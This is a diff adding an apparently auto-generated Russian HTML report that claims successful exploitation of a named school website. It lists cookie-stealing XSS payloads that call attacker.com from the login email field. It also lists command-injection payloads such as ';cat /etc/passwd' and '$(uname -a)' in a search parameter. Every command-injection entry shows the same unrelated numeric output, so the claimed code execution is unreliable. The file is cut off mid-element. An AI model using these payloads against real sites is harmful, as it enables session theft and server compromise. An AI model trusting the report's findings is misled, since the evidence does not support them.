@@ -1,0 +1,2004 @@
+
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Отчет об эксплуатации уязвимостей</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; line-height: 1.6; }
+            .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+            h2 { color: #2c3e50; margin-top: 30px; }
+            h3 { color: #2c3e50; }
+            .vulnerability { background: #f9f9f9; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .vuln-details { margin-left: 20px; }
+            .payload { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }
+            .extracted-data { background: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; max-height: 200px; overflow-y: auto; }
+            .admin-panel { background: #f9f9f9; border-left: 4px solid #f39c12; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .admin-compromised { border-left: 4px solid #e74c3c; }
+            .stats { background: #f9f9f9; border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 4px; }
+            .footer { margin-top: 30px; font-size: 0.8em; color: #7f8c8d; text-align: center; }
+            .credentials { background: #e74c3c; color: white; padding: 5px 8px; border-radius: 4px; font-family: monospace; }
+            .method { display: inline-block; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+            .get { background: #3498db; color: white; }
+            .post { background: #2ecc71; color: white; }
+            .rec-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 10px; margin: 10px 0; border-radius: 4px; }
+            .technique-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; border-radius: 4px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔍 ДЕТАЛЬНЫЙ ОТЧЕТ ОБ ЭКСПЛУАТАЦИИ УЯЗВИМОСТЕЙ</h1>
+    
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #1</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=U8zyybYA&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> U8zyybYA</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #2</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=OoX1lYDV&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> OoX1lYDV</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #3</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=oRsr0gkM&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> oRsr0gkM</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #4</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=7PmNN42F&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> 7PmNN42F</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #5</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=z6ZS6veJ&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> z6ZS6veJ</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ CROSS-SITE SCRIPTING (XSS) #6</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru/user/login</p>
+                        <p><strong>Метод запроса:</strong> <span class="method post">POST</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>LoginForm[email]</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><script>fetch("http://attacker.com?track=92YaLT7p&cookie="+document.cookie)</script></pre>
+                        
+                        <p><strong>Идентификатор трекинга:</strong> 92YaLT7p</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Метод эксплуатации:</strong> Внедрение JavaScript-кода, который может красть cookies и передавать их на сервер атакующего</p>
+                        </div>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать HTML-экранирование при выводе пользовательских данных</li>
+                                <li>Внедрить CSP-заголовки (Content Security Policy)</li>
+                                <li>Применять фреймворки с автоматическим экранированием</li>
+                                <li>Использовать атрибут HttpOnly для cookies</li>
+                                <li>Внедрить строгую валидацию входных данных</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #1</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;id</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #2</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|id</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #3</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`id`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #4</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(id)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #5</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;ls -la</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #6</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|ls -la</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #7</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`ls -la`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #8</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(ls -la)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #9</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;cat /etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #10</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|cat /etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #11</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`cat /etc/passwd`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #12</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(cat /etc/passwd)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #13</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;uname -a</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #14</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|uname -a</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #15</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`uname -a`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
